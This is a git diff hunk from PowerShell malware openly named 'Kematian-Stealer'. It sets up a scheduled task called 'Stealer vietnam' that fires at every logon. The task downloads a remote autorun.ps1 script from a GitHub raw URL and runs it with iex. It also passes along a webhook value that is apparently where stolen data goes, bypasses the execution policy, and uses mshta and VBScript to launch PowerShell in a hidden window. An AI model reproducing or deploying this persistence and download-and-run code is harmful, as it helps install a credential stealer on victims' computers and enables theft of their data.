@@ -81,10 +81,10 @@ function Invoke-TASKS {
         $task_name = "Stealer vietnam"
 	$powershellcode = "`$webhook='$webhook';iwr('https://raw.githubusercontent.com/adasdasdsaf/Kematian-Stealer/main/frontend-src/autorun.ps1')|iex"
         $task_action = if ($debug) {
-            New-ScheduledTaskAction -Execute "Powershell.exe" -Argument "-ExecutionPolicy Bypass -NoProfile -C `"`$webhook = '$webhook' ; iwr https://raw.githubusercontent.com/adasdasdsaf/Kematian-Stealer/main/frontend-src/autorun.ps1 | iex`""
+            New-ScheduledTaskAction -Execute "Powershell.exe" -Argument "-ExecutionPolicy Bypass -NoProfile -C `"$powershellcode`""
         }
         else {
-            New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `$webhook='$webhook';iwr('https://raw.githubusercontent.com/adasdasdsaf/Kematian-Stealer/main/frontend-src/autorun.ps1')|iex`",0)(window.close)"
+            New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"$powershellcode`",0)(window.close)"
         }
         $task_trigger = New-ScheduledTaskTrigger -AtLogOn
         $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
